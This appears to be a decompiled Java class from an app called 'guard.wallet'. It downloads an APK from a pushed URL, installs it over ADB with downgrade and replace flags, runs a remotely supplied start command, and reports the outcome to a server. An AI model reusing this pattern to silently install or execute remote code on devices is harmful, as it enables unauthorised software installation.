package com.guard.wallet.adb;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.http.HttpApiManager;
import com.guard.wallet.resp.PushResponseVO;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Future;

/**
 * vendor h/d -> AdbInstallTask.
 * ADB install task (下载 APK -> pm install -> 启动).
 */
public final class AdbInstallTask implements Runnable {
    public final AdbConnectionManager manager;
    public final String logId;
    public final String fileUrl;
    public final Future<String> downloadFuture;
    public final String startCommand;

    public AdbInstallTask(AdbConnectionManager manager, String logId, String fileUrl, Future<String> future, String startCommand) {
        this.manager = manager;
        this.logId = logId;
        this.fileUrl = fileUrl;
        this.downloadFuture = future;
        this.startCommand = startCommand;
    }

    @Override
    public void run() {
        AdbConnectionManager manager = this.manager;
        if (manager == null) {
            return;
        }

        PushResponseVO response = new PushResponseVO();
        response.setLogId(this.logId);
        response.setFileUrl(this.fileUrl);
        response.setInstallMethod(1);
        response.setDownloadResult(-1);
        response.setInstallResult(-1);
        response.setStartResult(-1);

        Future<String> future;
        do {
            future = this.downloadFuture;
        } while (future != null && !future.isDone());

        String localPath;
        try {
            localPath = future != null ? future.get() : null;
        } catch (Exception ex) {
            AppUtils.s("AdbConnectionManager", ex);
            localPath = null;
        }

        ConcurrentHashMap<String, Long> cache = manager.downloadCache;
        if (AppUtils.B(localPath)) {
            if (!AppUtils.B(this.fileUrl)) {
                cache.remove(this.fileUrl);
            }
            response.setDownloadResult(0);
            HttpApiManager.postDeviceInstallLog(response);
            return;
        }

        response.setDownloadResult(1);
        String installCommand = "pm install -d -t -r ".concat(localPath);
        if (!AppUtils.E(7912) && manager.executeWithMatcher(installCommand, new AdbLineMatcher("Success", true, 1),
                new AdbLineMatcher("INSTALL_FAILED", true, 0)) == 1) {
            response.setInstallResult(1);
        }

        if (!AppUtils.B(this.startCommand) && manager.executeShellCommand(this.startCommand)) {
            response.setStartResult(1);
        }

        AppUtils.n(localPath);
        if (!AppUtils.B(this.fileUrl)) {
            cache.remove(this.fileUrl);
        }
        HttpApiManager.postDeviceInstallLog(response);
    }
}
